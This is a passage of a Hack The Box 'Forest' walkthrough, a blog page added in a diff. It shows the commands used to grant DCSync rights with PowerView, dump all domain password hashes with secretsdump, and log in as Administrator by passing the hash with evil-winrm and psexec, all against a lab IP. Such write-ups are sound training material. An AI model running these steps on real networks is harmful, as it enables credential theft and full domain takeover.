+<p>Next, we will close the current <code class="language-plaintext highlighter-rouge">Evil-WinRM</code> session and reconnect with the newly created user. Once connected as the new user, we will download the <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a> script to our machine, which is part of <code class="language-plaintext highlighter-rouge">PowerSploit</code> (a collection of PowerShell scripts). As before, we will upload it using <code class="language-plaintext highlighter-rouge">Evil-WinRM</code> and then import it:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">upload</span><span class="w"> </span><span class="nx">PowerView.ps1</span><span class="w">
+</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/28.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Once imported, we will use the <code class="language-plaintext highlighter-rouge">Add-DomainObjectAcl</code> function to grant <code class="language-plaintext highlighter-rouge">DCsync</code> permissions to our newly created user:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-DomainObjectAcl <span class="nt">-TargetIdentity</span> <span class="s2">"DC=htb,DC=local"</span> <span class="nt">-PrincipalIdentity</span> username <span class="nt">-Rights</span> DCSync
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/29.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>With <code class="language-plaintext highlighter-rouge">DCsync</code> permissions granted to our user, we can use <code class="language-plaintext highlighter-rouge">secretsdump</code>, another script from the <code class="language-plaintext highlighter-rouge">Impacket</code> suite, to dump all domain users’ hashes:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-secretsdump htb.local/username:password@10.10.10.161
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/30.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Finally, we can perform a <code class="language-plaintext highlighter-rouge">Pass the Hash</code> attack, which involves using the <em>hash</em> we just obtained instead of the password (which we don’t know) to authenticate. For this, we could use <code class="language-plaintext highlighter-rouge">psexec</code> (another script from <code class="language-plaintext highlighter-rouge">Impacket</code>) or alternatively, via <code class="language-plaintext highlighter-rouge">Evil-WinRM</code> itself.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.10.10.161 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-H</span> <span class="s1">'HASH'</span>
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/31.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-psexec administrator@10.10.10.161 <span class="nt">-hash</span> HASH
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/32.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+</article>
+
+<div class="image-overlay" onclick="closeImage()"></div>
+<img id="expandedImage" class="expanded-image">
+
+<script>
+function expandImage(img) {
+  var expandedImg = document.getElementById("expandedImage");
+  var overlay = document.querySelector(".image-overlay");
+
+  expandedImg.src = img.src;
+
+  overlay.style.display = "block";
+  expandedImg.style.display = "block";
+
+  document.addEventListener("keydown", handleEscKey);
+}
+
+function closeImage() {
+  var expandedImg = document.getElementById("expandedImage");
+  var overlay = document.querySelector(".image-overlay");
+
+  overlay.style.display = "none";
+  expandedImg.style.display = "none";
+
+  document.removeEventListener("keydown", handleEscKey);
+}
+
+function handleEscKey(event) {
+  if (event.key === "Escape" || event.key === "Esc") {
+    closeImage();
+  }
+}
+</script>
+
+      </section>
+    </div>
+  </div>
+
+  
+
+  <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/4.0/">
+    <span>
+        <b>MateoNitro550</b>
+    </span>
+    
+    <span>© 2024</span>
+  </a>
+</footer>
+
+
+  
+    <script type="text/javascript">
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'G-524F5BE8G5', 'auto');
+  ga('send', 'pageview');
+</script>
+  
+
+</body>
+</html>
